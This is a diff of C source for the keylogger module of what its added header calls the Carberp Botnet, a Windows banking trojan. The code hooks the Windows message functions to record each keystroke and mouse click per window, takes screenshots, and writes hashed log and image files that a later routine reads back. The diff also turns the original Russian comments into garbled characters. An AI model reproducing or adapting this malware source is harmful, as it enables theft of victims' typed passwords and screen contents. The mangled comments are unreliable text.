@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <windowsx.h>
 
@@ -23,7 +34,7 @@
 #include "Screens.h"
 #include "md5.h"
 
-// Все функции которые мы будем хучить для KeyLogger
+// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ KeyLogger
 typedef BOOL ( WINAPI *PPeekMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
                                        UINT wMsgFilterMax, UINT wRemoveMsg );
 
@@ -32,7 +43,7 @@ typedef BOOL ( WINAPI *PGetMessage )( LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin
 
 typedef BOOL (WINAPI* PCloseWindow)(HWND hWnd);
 
-// Перехватываем как ANSI, так и UNICODE
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ ANSI, пїЅпїЅпїЅ пїЅ UNICODE
 static PCloseWindow Real_CloseWindow; 
 
 static PGetMessage	Real_GetMessageA;
@@ -50,8 +61,8 @@ static void ProcessMouseMessageW(LPMSG lpMsg, HWND hWnd);
 static void DumpKeyLogBufA();
 static void DumpKeyLogBufW();
 
-// Можно эти буфера выделить динамически при инициализации Кейлогера
-// и очистить при выключении приложения, но тогда надо писать ф-и init/shutdown_keyloger
+// пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅ init/shutdown_keyloger
 static CHAR  g_szKeyLogBufA[0x400] = {'\0'};
 static WCHAR g_szKeyLogBufW[0x400] = {L'\0'};
 static WCHAR SysPath1[0x400];// = {L'\0'};
@@ -98,9 +109,9 @@ void scrShot()
 {
 	typedef int ( WINAPI *fwsprintfW )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
 		fwsprintfW pwsprintfW = (fwsprintfW)GetProcAddressEx( NULL, 3, 0xEA3AF0C1 );
-	//клепаем скрин
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	screen_md5=SetScreensThread(&ScrName[0]);
-	// хеш самого файла картинки который будем передавать
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	m_memset(wcharHachFile,0,15*sizeof(WCHAR));
 	pwsprintfW((LPTSTR)wcharHachFile, (LPCTSTR)L"0x%u", screen_md5);
 
@@ -111,7 +122,7 @@ void DumpKeyLogBufA()
 {
 	if (0 != g_KeyLogbPosA)
 	{
-		// Ставим конец строки в буфере
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		g_szKeyLogBufA[g_KeyLogbPosA] = '\0';
 
 		char *OutBuf = (char *)MemAlloc(1024);
@@ -144,7 +155,7 @@ void DumpKeyLogBufW()
 {
 	if (0 != g_KeyLogbPosW)
 	{
-		// Ставим конец строки в буфере
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		g_szKeyLogBufW[g_KeyLogbPosW] = L'\0';
 
 		WCHAR *OutBuf = (WCHAR *)MemAlloc(1024);
@@ -178,22 +189,22 @@ void DumpKeyLogBufW()
 /************************************************************************/
 void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd)
 {
-	// Если в самый первый раз сюда попали
+	// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (0 == g_KeyLoghWnd) 
 	{
-		// Запоминаем хэндл окна
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		g_KeyLoghWnd = lpMsg->hwnd;
 	}
 	
-	// Если перехватили нажатие клавиши в том же самом окне, то добавляем
-	// символ в буфер
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (g_KeyLoghWnd == lpMsg->hwnd)
 	{
-		// Символ печатный?
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ?
 		if (lpMsg->wParam >= 32)
 			g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
 		else
-		// Обрабатываем спецклавиши
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			static char szWord[20] = {'\0'};
 			switch (lpMsg->wParam)
@@ -226,12 +237,12 @@ void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd)
 		}
 	}
 	else
-	// Если это уже другое окно, то дампим буфер и начинаем заполнять его
-	// с самого начала
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		DumpKeyLogBufA();
 
-		// Запоминаем хэндл окна
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		g_KeyLoghWnd = lpMsg->hwnd;
 
 		g_szKeyLogBufA[g_KeyLogbPosA++] = (char)lpMsg->wParam;
@@ -241,19 +252,19 @@ void ProcessCharMessageA(LPMSG lpMsg, HWND hWnd)
 /************************************************************************/
 void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd)
 {
-	// Если в самый первый раз сюда попали
+	// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (0 == g_KeyLoghWnd) 
 		g_KeyLoghWnd = lpMsg->hwnd;
 
-	// Если перехватили нажатие клавиши в том же самом окне, то добавляем
-	// символ в буфер
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (g_KeyLoghWnd == lpMsg->hwnd)
 	{
-		// Символ печатный?
+		// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ?
 		if (lpMsg->wParam >= 32)
 			g_szKeyLogBufW[g_KeyLogbPosW++] = lpMsg->wParam;
 		else
-		// Обрабатываем спецклавиши
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			static WCHAR szWord[20] = {L'\0'};
 			switch (lpMsg->wParam)
@@ -285,8 +296,8 @@ void ProcessCharMessageW(LPMSG lpMsg, HWND hWnd)
 		}
 	}
 	else
-	// Если это уже другое окно, то дампим буфер и начинаем заполнять его
-	// с самого начала
+	// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+	// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	{
 		DumpKeyLogBufW();
 		g_KeyLoghWnd = lpMsg->hwnd;
@@ -374,13 +385,13 @@ BOOL WINAPI Hook_PeekMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
 			case WM_LBUTTONDOWN:
 			case WM_RBUTTONDOWN:
 			{
-				// Если левая кнопка, то дампим буфер
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
 				{
 					DumpKeyLogBufA();
 				}
-				// Для мышиного сообщения надо вначале вызывать стандартный обработчик, иначе
-				// поля сообщения окажутся не заполенены
+				// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
 				ProcessMouseMessageA(lpMsg, hWnd);
 				return res;
@@ -415,13 +426,13 @@ BOOL WINAPI Hook_PeekMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
 			case WM_LBUTTONDOWN:
 			case WM_RBUTTONDOWN:
 			{
-				// Если левая кнопка, то дампим буфер
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 				if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
 				{
 					DumpKeyLogBufW();
 				}
-				// Для мышиного сообщения надо вначале вызывать стандартный обработчик, иначе
-				// поля сообщения окажутся не заполенены
+				// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ
+				// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				BOOL res = Real_PeekMessageA(lpMsg, hWnd, wMsgFilterMin, wMsgFilterMax, wRemoveMsg);
 				ProcessMouseMessageW(lpMsg, hWnd);
 				return res;
@@ -454,13 +465,13 @@ BOOL WINAPI Hook_GetMessageW(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
 		case WM_LBUTTONDOWN:
 		case WM_RBUTTONDOWN:
 		{
-			// Если левая кнопка, то дампим буфер
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
 			{
 				DumpKeyLogBufW();
 			}
-			// В отличии от PeekMessage здесь уже все
-			// поля сообщения заполнены, поэтому вызываем наш обработчик
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ PeekMessage пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			ProcessMouseMessageW(lpMsg, hWnd);
 		}
 	}
@@ -491,13 +502,13 @@ BOOL WINAPI Hook_GetMessageA(LPMSG lpMsg, HWND hWnd, UINT wMsgFilterMin,
 		case WM_LBUTTONDOWN:
 		case WM_RBUTTONDOWN:
 		{
-			// Если левая кнопка, то дампим буфер
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 			if ((lpMsg->hwnd != g_KeyLoghWnd) && (WM_LBUTTONDOWN == lpMsg->message))
 			{
 				DumpKeyLogBufA();
 			}
-			// В отличии от PeekMessage здесь уже все
-			// поля сообщения заполнены, поэтому вызываем наш обработчик
+			// пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ PeekMessage пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ
+			// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			ProcessMouseMessageA(lpMsg, hWnd);
 		}
 	}
@@ -571,8 +582,8 @@ DWORD StrHachToDWORD(char*HachStr)
 /************************************************************************/
 bool WINAPI IsKeyLoggerProcess()
 {
-	// Функция вернёт истину если она вызвана в процессе
-	// Java.exe или Javaw.exe
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// Java.exe пїЅпїЅпїЅ Javaw.exe
 
 	
 
@@ -598,10 +609,10 @@ bool WINAPI IsKeyLoggerProcess()
 	plstrcpyW( path, SysPath1 );
 			
 	
-	plstrcatW( path, szFileBuf );//по пиду и добавить папку
+	plstrcatW( path, szFileBuf );//пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 
-	//	Коля
-//	Здесь список хешей процессов берётся из файла
+	//	пїЅпїЅпїЅпїЅ
+//	пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	HANDLE hFile = (HANDLE)pCreateFileW( path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 );
 	if (hFile==INVALID_HANDLE_VALUE)return false;	
 
@@ -612,7 +623,7 @@ bool WINAPI IsKeyLoggerProcess()
 	int i;
 	char *cUrl=&DataPath[0],*cUrlNext;
 	while (true)
-	{// проверяем есть ли в списке наш процесс
+	{// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		cUrl= m_strstr(&cUrl[0],"0x");
 		if (cUrl==NULL)break;
 		cUrlNext= m_strstr(cUrl,"|");
@@ -628,7 +639,7 @@ bool WINAPI IsKeyLoggerProcess()
 		cUrl= m_strstr(&cUrl[1],"0x");
 	}
 
-	if (fleg )//наконецто чтото нашли, начнем...
+	if (fleg )//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ...
 	{
 		
 		typedef int ( WINAPI *fwsprintfW )( LPTSTR lpOut, LPCTSTR lpFmt, ... );
@@ -638,21 +649,21 @@ bool WINAPI IsKeyLoggerProcess()
 		WCHAR szBuf[25];
 		m_memset(szBuf,0,25*sizeof(WCHAR));
 
-		//формируем имя файла лога
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 		plstrcpyW(ScrName, SysPath1);
 		pwsprintfW((LPTSTR)szBuf, (LPCTSTR)L"\\hash%u.dats", hachFileName);		
 		plstrcatW( SysPath1, szBuf );
 		
-		//формируем имя джепега
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		WCHAR szBuf1[25];
 		m_memset(szBuf1,0,25*sizeof(WCHAR));
 		pwsprintfW((LPTSTR)szBuf1, (LPCTSTR)L"\\scr%u.jpg", hachFileName);		
 		plstrcatW( ScrName, szBuf1 );
 		
-		//инициализируем скриншоты
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		InitScreenLib();
 		
-		//хеш запуска файла, он считаеться из имени лог файла
+		//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		m_memset(sHach,0,15*sizeof(WCHAR));
 		pwsprintfW((LPTSTR)sHach, (LPCTSTR)L"0x%u", CalcHashW( szBuf ));
 	
@@ -671,10 +682,10 @@ bool WINAPI IsKeyLoggerProcess()
 bool HookKeyLoggerApi()
 {
 	
-//генерируем уникальный номер запуска процесса и создаём файл
-//из каждого хука пишем лог в файл 
-//каждый на новой строке
-//аналогично как  идёт вызов ф-ии ouputdebugstring(так в новую строку и фигачим)
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ 
+//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ-пїЅпїЅ ouputdebugstring(пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 
 	if ( HookApi( 3, 0xD7A87C2C, (DWORD)&Hook_PeekMessageA ) )
 	{  
@@ -709,8 +720,8 @@ bool HookKeyLoggerApi()
 /************************************************************************/
 bool HookKeyLogger()
 {
-	// функция вешает хуки на базовые функции которые использует
-	// KeyLogger для работы с сообщениями окон
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// KeyLogger пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	//
 	
 
@@ -727,7 +738,7 @@ bool HookKeyLogger()
 }
 DWORD GetByteFileHash( LPBYTE FileContent, DWORD dwFileSize )
 {	
-	//возвращаем хеш мд5 полученного массива байт
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ5 пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 	LPBYTE pbyFile  = FileContent;
 
@@ -769,18 +780,18 @@ DWORD GetByteFileHash( LPBYTE FileContent, DWORD dwFileSize )
 
 LPBYTE ReadOpenDirectory(int FlagFolderDest,WCHAR *Path, WCHAR *Ext)
 {
-	WCHAR SysPath[MAX_PATH];//получаем путь к заданной дериктории
+	WCHAR SysPath[MAX_PATH];//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	pSHGetFolderPathW(NULL, FlagFolderDest, NULL, 0, SysPath);
 	plstrcatW( SysPath, L"\\" );
 	plstrcatW( SysPath, Path );
 	if (SysPath[(int)plstrlenW(SysPath)-1]!='\\')
 		plstrcatW( SysPath, L"\\" );
-	// Функция отправляет файлы с расширением Ext из директории Path 
-	// Возвращает общий размер удалённых файлов
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Ext пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Path 
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	if (Path == NULL || Ext == NULL)
 		return NULL;
 	
-	// директории находиться не будут
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	
 	WCHAR Mask[MAX_PATH];
 	plstrcpyW(Mask,SysPath);
@@ -795,48 +806,48 @@ LPBYTE ReadOpenDirectory(int FlagFolderDest,WCHAR *Path, WCHAR *Ext)
 	}
 	//LPBYTE hResult=NULL;
 	DWORD dwGlobSiz=0;
-	// Перебираем найденные файлы
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	while (File != NULL)
 	{
         if ((Search.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == 0)
 		{
-			// Удаляем файл
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 			WCHAR FileName[MAX_PATH];
 			m_memset(FileName,0,MAX_PATH);
 			plstrcpyW(FileName,SysPath);
 			plstrcatW(FileName,Search.cFileName);
 
 			//PCHAR FileName = STR::New(2, Path, Search.cFileName);
-			//  В случае если файл имеет атрибут "Только чтение" меняем
-			//  ему атрибуты
+			//  пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ "пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ" пїЅпїЅпїЅпїЅпїЅпїЅ
+			//  пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			if ((Search.dwFileAttributes & FILE_ATTRIBUTE_READONLY) != 0)
 				pSetFileAttributesW(FileName, FILE_ATTRIBUTE_ARCHIVE);
 			{
 				DWORD dwWriteB=0;
-				LPBYTE Data=GetFileData(FileName,&dwWriteB);//читаем файл
+				LPBYTE Data=GetFileData(FileName,&dwWriteB);//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 				if (dwWriteB)
 				if (Data!=NULL)
 				{
 				
-					//тмя джепега
+					//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					char* lpData1=(char*)Data;			
 					char* lpData=m_strstr((char*)lpData1,"\r\n");					
 					DWORD ttt=(lpData-(char*)lpData1);
 					PCHAR fFileName=STR::New((PCHAR)lpData1,ttt);
 
-					//хеш вызваной проги
+					//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 					lpData1=lpData+2;			
 					lpData=m_strstr((char*)lpData1,"\r\n");					
 					ttt=(lpData-(char*)lpData1);
 					PCHAR Hach=STR::New((PCHAR)lpData1,ttt);
 					
-					//хеш запуска
+					//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 					lpData1=lpData+2;			
